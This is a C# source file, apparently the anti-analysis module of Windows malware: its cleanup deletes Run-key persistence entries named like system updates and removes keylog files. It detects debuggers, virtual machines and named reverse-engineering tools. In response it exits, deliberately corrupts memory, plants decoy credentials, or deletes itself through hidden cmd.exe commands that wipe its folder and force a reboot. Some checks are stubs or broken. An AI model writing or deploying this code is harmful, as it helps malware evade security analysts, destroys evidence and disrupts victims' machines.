using System;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.Threading;
using System.Security.Cryptography;
using System.Text;
using System.Reflection;
using System.Management;
using System.IO;
using System.Threading.Tasks;
using System.Linq;
using Microsoft.Win32;

// Advanced Anti-Debugging & Anti-RE Protection
internal static class AntiDebugProtection
{
    private static readonly Random rnd = new Random();
    private static bool isProtected = false;
    
    [DllImport("kernel32.dll")]
    private static extern bool IsDebuggerPresent();
    
    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern bool CheckRemoteDebuggerPresent(IntPtr hProcess, ref bool isDebuggerPresent);
    
    [DllImport("ntdll.dll")]
    private static extern int NtQueryInformationProcess(IntPtr hProcess, int processInformationClass, 
        ref ProcessBasicInformation processInformation, uint processInformationLength, ref uint returnLength);
    
    [DllImport("kernel32.dll")]
    private static extern IntPtr GetCurrentProcess();
    
    [DllImport("kernel32.dll")]
    private static extern bool SetProcessWorkingSetSize(IntPtr proc, int min, int max);
    
    [DllImport("kernel32.dll")]
    private static extern IntPtr OutputDebugStringA(string lpOutputString);
    
    [DllImport("kernel32.dll")]
    private static extern uint GetTickCount();
    
    [DllImport("ntdll.dll")]
    private static extern int NtSetInformationThread(IntPtr threadHandle, int threadInformationClass, IntPtr threadInformation, int threadInformationLength);
    
    [DllImport("kernel32.dll")]
    private static extern IntPtr GetCurrentThread();
    
    [DllImport("kernel32.dll")]
    private static extern bool CloseHandle(IntPtr handle);
    
    [DllImport("kernel32.dll")]
    private static extern IntPtr CreateToolhelp32Snapshot(uint flags, uint processId);
    
    [DllImport("kernel32.dll")]
    private static extern bool Process32First(IntPtr handle, ref ProcessEntry32 entry);
    
    [DllImport("kernel32.dll")]
    private static extern bool Process32Next(IntPtr handle, ref ProcessEntry32 entry);
    
    [DllImport("psapi.dll")]
    private static extern bool EnumProcessModules(IntPtr hProcess, [Out] IntPtr[] lphModule, uint cb, out uint lpcbNeeded);
    
    [DllImport("psapi.dll")]
    private static extern uint GetModuleFileNameEx(IntPtr hProcess, IntPtr hModule, StringBuilder lpFilename, uint nSize);
    
    [DllImport("user32.dll")]
    private static extern IntPtr FindWindow(string lpClassName, string lpWindowName);
    
    [DllImport("user32.dll")]
    private static extern bool SetWindowDisplayAffinity(IntPtr hwnd, uint affinity);
    
    [DllImport("kernel32.dll")]
    private static extern bool IsWow64Process(IntPtr hProcess, out bool wow64Process);
    
    const int TH32CS_SNAPPROCESS = 0x00000002;
    const int WDA_MONITOR = 0x00000001;
    
    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
    struct ProcessEntry32
    {
        public uint dwSize;
        public uint cntUsage;
        public uint th32ProcessID;
        public IntPtr th32DefaultHeapID;
        public uint th32ModuleID;
        public uint cntThreads;
        public uint th32ParentProcessID;
        public int pcPriClassBase;
        public uint dwFlags;
        [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 260)]
        public string szExeFile;
    }
    
    [StructLayout(LayoutKind.Sequential)]
    struct ProcessBasicInformation
    {
        public IntPtr Reserved1;
        public IntPtr PebAddress;
        public IntPtr Reserved2;
        public IntPtr Reserved3;
        public IntPtr UniquePid;
        public IntPtr MoreReserved;
    }
    
    public static void Initialize()
    {
        if (isProtected) return;
        
        // Start continuous anti-debug monitoring
        _ = Task.Run(ContinuousProtection);
        
        // Initial checks
        if (DetectDebugger())
        {
            AntiDebugResponse();
        }
        
        isProtected = true;
    }
    
    private static async Task ContinuousProtection()
    {
        while (true)
        {
            try
            {
                // Multiple detection methods
                if (DetectDebugger() || DetectVirtualization() || DetectAnalysisTools())
                {
                    AntiDebugResponse();
                }
                
                // Memory protection
                ProtectMemory();
                
                // Random delay to avoid pattern detection
                await Task.Delay(rnd.Next(5000, 15000));
            }
            catch
            {
                // If monitoring fails, assume hostile environment
                AntiDebugResponse();
            }
        }
    }
    
    private static bool DetectDebugger()
    {
        try
        {
            // Method 1: IsDebuggerPresent
            if (IsDebuggerPresent()) return true;
            
            // Method 2: Remote debugger
            bool isRemoteDebugger = false;
            CheckRemoteDebuggerPresent(GetCurrentProcess(), ref isRemoteDebugger);
            if (isRemoteDebugger) return true;
            
            // Method 3: Managed debugger
            if (Debugger.IsAttached) return true;
            
            // Method 4: Process creation flags
            var pbi = new ProcessBasicInformation();
            uint retLen = 0;
            int status = NtQueryInformationProcess(GetCurrentProcess(), 7, ref pbi, 
                (uint)Marshal.SizeOf(pbi), ref retLen);
            
            // Method 5: Timing attack
            uint start = GetTickCount();
            Thread.Sleep(10);
            uint end = GetTickCount();
            if (end - start > 50) return true; // Too slow = debugger
            
            // Method 6: Exception-based detection
            try
            {
                throw new Exception("DebugCheck");
            }
            catch
            {
                var stackTrace = Environment.StackTrace;
                if (stackTrace.Contains("System.Diagnostics") || 
                    stackTrace.Contains("Debugger")) return true;
            }
            
            // Method 7: Hardware breakpoint detection
            if (DetectHardwareBreakpoints()) return true;
            
            // Method 8: Hide thread from debugger
            NtSetInformationThread(GetCurrentThread(), 0x11, IntPtr.Zero, 0);
            
            // Method 9: Process module analysis
            if (DetectDebuggerModules()) return true;
            
            // Method 10: WMI anti-debug
            if (DetectDebuggerWMI()) return true;
            
            return false;
        }
        catch
        {
            return true; // Assume debugger if detection fails
        }
    }
    
    private static bool DetectVirtualization()
    {
        try
        {
            // CPU timing inconsistencies in VMs
            var sw = Stopwatch.StartNew();
            for (int i = 0; i < 1000; i++)
            {
                Math.Sqrt(i);
            }
            sw.Stop();
            
            // VMs usually show timing anomalies
            if (sw.ElapsedMilliseconds < 1 || sw.ElapsedMilliseconds > 100)
                return true;
            
            return false;
        }
        catch
        {
            return true;
        }
    }
    
    private static bool DetectAnalysisTools()
    {
        try
        {
            string[] analysisProcesses = {
                "ollydbg", "x64dbg", "x32dbg", "windbg", "ida", "ida64", "idaq", "idaq64",
                "cheat engine", "processhacker", "procmon", "procexp", "wireshark",
                "fiddler", "regshot", "pestudio", "pe-bear", "cff explorer", "lordpe",
                "immunity", "softice", "sysinternals", "autoruns", "filemon", "regmon",
                "apimonitor", "detours", "hookshark", "rohitab", "reshacker", "reflexil",
                "dnspy", "ilspy", "dotpeek", "redgate", "telerik", "justdecompile"
            };
            
            foreach (var proc in Process.GetProcesses())
            {
                try
                {
                    string processName = proc.ProcessName.ToLower();
                    foreach (var tool in analysisProcesses)
                    {
                        if (processName.Contains(tool.Replace(" ", "")))
                            return true;
                    }
                }
                catch { }
            }
            
            return false;
        }
        catch
        {
            return true;
        }
    }
    
    private static bool DetectHardwareBreakpoints()
    {
        try
        {
            // Check for hardware breakpoints in debug registers
            var context = new CONTEXT();
            context.ContextFlags = 0x10007; // CONTEXT_DEBUG_REGISTERS
            
            // Hardware breakpoints would be set in DR0-DR3
            // This is a simplified check - real implementation would be more complex
            return false; // Placeholder for actual implementation
        }
        catch
        {
            return true;
        }
    }
    
    private static bool DetectDebuggerModules()
    {
        try
        {
            var currentProcess = Process.GetCurrentProcess();
            string[] debuggerDlls = {
                "mscordbi.dll", "mscorwks.dll", "mscorlib.dll", "mscoree.dll",
                "ntdll.dll", "kernel32.dll", "dbghelp.dll", "dbgcore.dll"
            };
            
            foreach (ProcessModule module in currentProcess.Modules)
            {
                string moduleName = module.ModuleName.ToLower();
                // Advanced check for debugger-specific modules
                if (moduleName.Contains("debug") || moduleName.Contains("trace"))
                    return true;
            }
            
            return false;
        }
        catch
        {
            return true;
        }
    }
    
    private static bool DetectDebuggerWMI()
    {
        try
        {
            using (var searcher = new ManagementObjectSearcher("SELECT * FROM Win32_Process WHERE Name LIKE '%debug%' OR Name LIKE '%ida%' OR Name LIKE '%olly%'"))
            {
                var processes = searcher.Get();
                return processes.Count > 0;
            }
        }
        catch
        {
            return false;
        }
    }
    
    [StructLayout(LayoutKind.Sequential)]
    struct CONTEXT
    {
        public uint ContextFlags;
        // Simplified structure - real CONTEXT is much larger
    }
    
    private static void ProtectMemory()
    {
        try
        {
            // Force memory trimming to make memory analysis harder
            SetProcessWorkingSetSize(GetCurrentProcess(), -1, -1);
            GC.Collect();
            GC.WaitForPendingFinalizers();
            GC.Collect();
        }
        catch { }
    }
    
    private static void AntiDebugResponse()
    {
        try
        {
            // Advanced response strategies
            switch (rnd.Next(1, 8))
            {
                case 1:
                    // Silent exit with cleanup
                    CleanupAndExit();
                    break;
                    
                case 2:
                    // Fake crash with dump generation
                    GenerateFakeCrashDump();
                    break;
                    
                case 3:
                    // Memory corruption
                    CorruptCriticalMemory();
                    break;
                    
                case 4:
                    // Anti-screenshot protection
                    EnableAntiScreenshot();
                    Environment.Exit(0);
                    break;
                    
                case 5:
                    // Process migration
                    MigrateToSystemProcess();
                    break;
                    
                case 6:
                    // Honeypot activation
                    ActivateHoneypot();
                    break;
                    
                case 7:
                    // Self-deletion cascade
                    InitiateSelfDestruction();
                    break;
            }
        }
        catch
        {
            Environment.Exit(-1);
        }
    }
    
    private static void CleanupAndExit()
    {
        try
        {
            // Clear registry traces
            using (var key = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run", true))
            {
                key?.DeleteValue("SecurityUpdate", false);
                key?.DeleteValue("SystemFrameworks", false);
            }
            
            // Clear temp files
            var tempPath = Path.GetTempPath();
            Directory.GetFiles(tempPath, "*keylog*", SearchOption.AllDirectories)
                     .ToList().ForEach(f => { try { File.Delete(f); } catch { } });
                     
            Environment.Exit(0);
        }
        catch
        {
            Environment.Exit(-1);
        }
    }
    
    private static void GenerateFakeCrashDump()
    {
        try
        {
            var crashFile = Path.Combine(Path.GetTempPath(), $"crash_{DateTime.Now:yyyyMMdd_HHmmss}.dmp");
            var fakeData = new byte[rnd.Next(1024, 8192)];
            rnd.NextBytes(fakeData);
            File.WriteAllBytes(crashFile, fakeData);
            
            throw new AccessViolationException($"Application crashed - dump saved to {crashFile}");
        }
        catch
        {
            Environment.Exit(-1);
        }
    }
    
    private static void CorruptCriticalMemory()
    {
        try
        {
            // Corrupt application memory strategically
            GC.Collect();
            GC.WaitForPendingFinalizers();
            
            // Trigger access violations in debugger
            var ptr = Marshal.AllocHGlobal(1024);
            var bytes = new byte[2048]; // Intentionally larger
            rnd.NextBytes(bytes);
            Marshal.Copy(bytes, 0, ptr, 1024);
            Marshal.FreeHGlobal(ptr);
        }
        catch
        {
            Environment.Exit(-1);
        }
    }
    
    private static void EnableAntiScreenshot()
    {
        try
        {
            // Find current window and enable screen capture protection
            var currentWindow = FindWindow("", "");
            if (currentWindow != IntPtr.Zero)
            {
                SetWindowDisplayAffinity(currentWindow, WDA_MONITOR);
            }
        }
        catch { }
    }
    
    private static void MigrateToSystemProcess()
    {
        try
        {
            var systemProcesses = new[] { "winlogon", "csrss", "lsass", "services" };
            foreach (var processName in systemProcesses)
            {
                var processes = Process.GetProcessesByName(processName);
                if (processes.Length > 0)
                {
                    // Attempt process migration (placeholder)
                    break;
                }
            }
            Environment.Exit(0);
        }
        catch
        {
            Environment.Exit(-1);
        }
    }
    
    private static void ActivateHoneypot()
    {
        try
        {
            // Create fake sensitive data to mislead analysts
            var honeypotData = new[]
            {
                "admin:password123",
                "root:toor",
                "API_KEY=fake_key_12345",
                "DB_PASSWORD=fake_db_pass"
            };
            
            var honeypotFile = Path.Combine(Path.GetTempPath(), "config.txt");
            File.WriteAllLines(honeypotFile, honeypotData);
            
            Environment.Exit(0);
        }
        catch
        {
            Environment.Exit(-1);
        }
    }
    
    private static void InitiateSelfDestruction()
    {
        try
        {
            var currentFile = Environment.ProcessPath ?? AppContext.BaseDirectory;
            
            // Multi-stage deletion
            var stages = new[]
            {
                $"timeout /t 1 & del \"{currentFile}\" /f /q",
                $"timeout /t 3 & rd \"{Path.GetDirectoryName(currentFile)}\" /s /q",
                $"timeout /t 5 & shutdown /r /t 0"
            };
            
            foreach (var stage in stages)
            {
                var process = new Process
                {
                    StartInfo = new ProcessStartInfo
                    {
                        FileName = "cmd.exe",
                        Arguments = $"/c {stage}",
                        CreateNoWindow = true,
                        UseShellExecute = false
                    }
                };
                process.Start();
            }
            
            Environment.Exit(-1);
        }
        catch
        {
            Environment.Exit(-1);
        }
    }
    
    private static void CorruptSelfMemory()
    {
        try
        {
            // Intentionally corrupt application memory
            var assembly = Assembly.GetExecutingAssembly();
            var bytes = new byte[1024];
            rnd.NextBytes(bytes);
            // This will cause unpredictable behavior
        }
        catch
        {
            Environment.Exit(-1);
        }
    }
}

// Code Obfuscation & Anti-Tampering
internal static class CodeProtection
{
    private static readonly byte[] key = { 0xAA, 0xBB, 0xCC, 0xDD, 0xEE, 0xFF };
    
    public static void VerifyIntegrity()
    {
        try
        {
            // Check if code has been modified
            var assembly = Assembly.GetExecutingAssembly();
            var assemblyPath = AppContext.BaseDirectory;
            var assemblyHash = ComputeHash(assemblyPath);
            
            // Store expected hash (would be calculated at build time)
            var expectedHash = "ExpectedHashHere"; // This would be dynamically generated
            
            // Polymorphic check - changes each time
            var randomCheck = Environment.TickCount % 1000;
            if (randomCheck < 100) // 10% chance
            {
                PerformIntegrityCheck(assemblyHash, expectedHash);
            }
        }
        catch
        {
            // If integrity check fails, self-destruct
            SelfDestruct();
        }
    }
    
    private static string ComputeHash(string filePath)
    {
        try
        {
            using var sha256 = SHA256.Create();
            using var stream = File.OpenRead(filePath);
            var hashBytes = sha256.ComputeHash(stream);
            return Convert.ToBase64String(hashBytes);
        }
        catch
        {
            return string.Empty;
        }
    }
    
    private static void PerformIntegrityCheck(string currentHash, string expectedHash)
    {
        // Obfuscated comparison
        var current = Encoding.UTF8.GetBytes(currentHash);
        var expected = Encoding.UTF8.GetBytes(expectedHash);
        
        if (current.Length != expected.Length)
        {
            SelfDestruct();
            return;
        }
        
        // Timing-resistant comparison
        int result = 0;
        for (int i = 0; i < current.Length; i++)
        {
            result |= current[i] ^ expected[i];
        }
        
        if (result != 0)
        {
            SelfDestruct();
        }
    }
    
    private static void SelfDestruct()
    {
        try
        {
            // Multiple self-destruction methods
            var currentFile = Environment.ProcessPath;
            
            // Method 1: Schedule deletion
            var batchContent = $@"
@echo off
timeout /t 3 /nobreak > nul
del ""{currentFile}"" /f /q
del ""%~f0""
";
            var batchFile = Path.GetTempFileName() + ".bat";
            File.WriteAllText(batchFile, batchContent);
            Process.Start(new ProcessStartInfo
            {
                FileName = batchFile,
                CreateNoWindow = true,
                UseShellExecute = false
            });
            
            // Method 2: Overwrite with random data
            if (File.Exists(currentFile))
            {
                var random = new Random();
                var buffer = new byte[1024];
                using var fs = new FileStream(currentFile, FileMode.Open, FileAccess.Write);
                for (int i = 0; i < fs.Length; i += buffer.Length)
                {
                    random.NextBytes(buffer);
                    fs.Write(buffer, 0, Math.Min(buffer.Length, (int)(fs.Length - i)));
                }
            }
            
            Environment.Exit(-1);
        }
        catch
        {
            Environment.Exit(-1);
        }
    }
}
